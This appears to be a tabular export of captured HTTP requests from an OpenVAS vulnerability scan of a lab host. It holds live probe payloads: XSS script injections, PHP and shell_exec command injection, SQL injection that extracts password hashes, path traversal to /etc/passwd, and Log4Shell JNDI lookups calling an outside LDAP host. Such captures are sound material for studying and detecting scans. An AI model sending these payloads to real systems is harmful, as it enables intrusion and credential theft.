http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24291						1	http://192.168.1.104/web/message.php?skin="><script>alert(/openvasvt/)</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/message.php?skin="><script>alert(/openvasvt/)</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/netoffice/general/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/netoffice/general/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24297						1	http://192.168.1.104/Dwins/general/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/Dwins/general/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24298						1	http://192.168.1.104/general/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/general/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24299						1	http://192.168.1.104/cgi-bin/general/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/general/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24300						1	http://192.168.1.104/web/general/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/general/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=%3C/option%3E%3C/SELECT%3E%3C?phpinfo();?%3E		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=%3C/option%3E%3C/SELECT%3E%3C?phpinfo();?%3E
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24306						1	http://192.168.1.104/cgi-bin/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=%3C/option%3E%3C/SELECT%3E%3C?phpinfo();?%3E		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=%3C/option%3E%3C/SELECT%3E%3C?phpinfo();?%3E
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24307						1	http://192.168.1.104/web/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=%3C/option%3E%3C/SELECT%3E%3C?phpinfo();?%3E		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=%3C/option%3E%3C/SELECT%3E%3C?phpinfo();?%3E
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/nette.micro/?callback=shell_exec&cmd=id&what=-1		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nette.micro/?callback=shell_exec&cmd=id&what=-1
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24313						1	http://192.168.1.104/index.php/nette.micro/?callback=shell_exec&cmd=id&what=-1		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/index.php/nette.micro/?callback=shell_exec&cmd=id&what=-1
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24314						1	http://192.168.1.104/cgi-bin/nette.micro/?callback=shell_exec&cmd=id&what=-1		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/nette.micro/?callback=shell_exec&cmd=id&what=-1
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24315						1	http://192.168.1.104/cgi-bin/index.php/nette.micro/?callback=shell_exec&cmd=id&what=-1		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/index.php/nette.micro/?callback=shell_exec&cmd=id&what=-1
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24316						1	http://192.168.1.104/web/nette.micro/?callback=shell_exec&cmd=id&what=-1		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/nette.micro/?callback=shell_exec&cmd=id&what=-1
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24317						1	http://192.168.1.104/web/index.php/nette.micro/?callback=shell_exec&cmd=id&what=-1		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/index.php/nette.micro/?callback=shell_exec&cmd=id&what=-1
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/nqt.php?target=127.0.0.1&queryType=all&portNum=foobar%3Cscript%3Efoo%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nqt.php?target=127.0.0.1&queryType=all&portNum=foobar%3Cscript%3Efoo%3C/script%3E
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24324						1	http://192.168.1.104/nqt/nqt.php?target=127.0.0.1&queryType=all&portNum=foobar%3Cscript%3Efoo%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nqt/nqt.php?target=127.0.0.1&queryType=all&portNum=foobar%3Cscript%3Efoo%3C/script%3E
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24325						1	http://192.168.1.104/cgi-bin/nqt.php?target=127.0.0.1&queryType=all&portNum=foobar%3Cscript%3Efoo%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/nqt.php?target=127.0.0.1&queryType=all&portNum=foobar%3Cscript%3Efoo%3C/script%3E
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24326						1	http://192.168.1.104/web/nqt.php?target=127.0.0.1&queryType=all&portNum=foobar%3Cscript%3Efoo%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/nqt.php?target=127.0.0.1&queryType=all&portNum=foobar%3Cscript%3Efoo%3C/script%3E
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/newsportal/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/newsportal/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Close										192.168.1.104															1	http://192.168.1.104/cgi-bin/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)		${jndi:ldap://192.168.133.137:11730/a}		/cgi-bin/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/nforum/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nforum/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24343						1	http://192.168.1.104/forum/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/forum/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24345						1	http://192.168.1.104/board/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/board/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24346						1	http://192.168.1.104/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24347						1	http://192.168.1.104/cgi-bin/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24348						1	http://192.168.1.104/web/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/showtheme.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,CONCAT(name,%200x3a,%20passwd_hash),NULL,5,6,7%20FROM%20users%23
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/nodesforum/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nodesforum/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24354						1	http://192.168.1.104/Nodesforum/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/Nodesforum/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/index_en.jsp		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/index_en.jsp
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24360						1	http://192.168.1.104/nordex/index_en.jsp		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nordex/index_en.jsp
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24361						1	http://192.168.1.104/nc2/index_en.jsp		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nc2/index_en.jsp
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24363						1	http://192.168.1.104/cgi-bin/index_en.jsp		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/index_en.jsp
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24364						1	http://192.168.1.104/web/index_en.jsp		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/index_en.jsp
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/gw/webacc?User.interface=/../webacc/wml		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/gw/webacc?User.interface=/../webacc/wml
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24370						1	http://192.168.1.104/servlet/webacc?User.interface=/../webacc/wml		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/servlet/webacc?User.interface=/../webacc/wml
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24371						1	http://192.168.1.104/webacc?User.interface=/../webacc/wml		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/webacc?User.interface=/../webacc/wml
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24372						1	http://192.168.1.104/cgi-bin/webacc?User.interface=/../webacc/wml		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/webacc?User.interface=/../webacc/wml
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24373						1	http://192.168.1.104/web/webacc?User.interface=/../webacc/wml		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/webacc?User.interface=/../webacc/wml
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/servlet/webacc_909324340		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/servlet/webacc_909324340
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24379						1	http://192.168.1.104/servlet/webacc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/servlet/webacc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/nubuilder/productionnu2/report.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nubuilder/productionnu2/report.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24385						1	http://192.168.1.104/productionnu2/report.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/productionnu2/report.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24386						1	http://192.168.1.104/cgi-bin/productionnu2/report.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/productionnu2/report.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24387						1	http://192.168.1.104/web/productionnu2/report.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/productionnu2/report.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/nubuilder/productionnu2/fileuploader.php?dir=../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nubuilder/productionnu2/fileuploader.php?dir=../../../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24393						1	http://192.168.1.104/productionnu2/fileuploader.php?dir=../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/productionnu2/fileuploader.php?dir=../../../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24394						1	http://192.168.1.104/cgi-bin/productionnu2/fileuploader.php?dir=../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/productionnu2/fileuploader.php?dir=../../../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24395						1	http://192.168.1.104/web/productionnu2/fileuploader.php?dir=../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/productionnu2/fileuploader.php?dir=../../../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/index.php?file=Liens&op="><script>window.alert('test');</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/index.php?file=Liens&op="><script>window.alert('test');</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24401						1	http://192.168.1.104/cgi-bin/index.php?file=Liens&op="><script>window.alert('test');</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/index.php?file=Liens&op="><script>window.alert('test');</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24403						1	http://192.168.1.104/web/index.php?file=Liens&op="><script>window.alert('test');</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/index.php?file=Liens&op="><script>window.alert('test');</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Close										192.168.1.104															1	http://192.168.1.104/cgi-bin/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)		${jndi:ldap://kali:11730/a}		/cgi-bin/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/nullam/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/nullam/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/ocportal/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/ocportal/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/admin/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/admin/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24424						1	http://192.168.1.104/octavocms/admin/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/octavocms/admin/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24425						1	http://192.168.1.104/cms/admin/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cms/admin/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24426						1	http://192.168.1.104/cgi-bin/admin/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/admin/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24427						1	http://192.168.1.104/web/admin/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/admin/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/php-member-login/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/php-member-login/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/oss7/lib/browsefiles.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/oss7/lib/browsefiles.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24438						1	http://192.168.1.104/oss7/lib/browsefolders.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/oss7/lib/browsefolders.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24439						1	http://192.168.1.104/oss6/lib/browsefiles.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/oss6/lib/browsefiles.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24440						1	http://192.168.1.104/oss6/lib/browsefolders.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/oss6/lib/browsefolders.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24442						1	http://192.168.1.104/oss5/lib/browsefiles.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/oss5/lib/browsefiles.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24444						1	http://192.168.1.104/oss5/lib/browsefolders.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/oss5/lib/browsefolders.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24446						1	http://192.168.1.104/lib/browsefiles.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/lib/browsefiles.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24447						1	http://192.168.1.104/lib/browsefolders.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/lib/browsefolders.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24448						1	http://192.168.1.104/cgi-bin/lib/browsefiles.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/lib/browsefiles.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24449						1	http://192.168.1.104/cgi-bin/lib/browsefolders.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/lib/browsefolders.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24450						1	http://192.168.1.104/web/lib/browsefiles.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/lib/browsefiles.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									24451						1	http://192.168.1.104/web/lib/browsefolders.php?dir=/etc		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/lib/browsefolders.php?dir=/etc
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/mailer/admin/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/mailer/admin/index.php
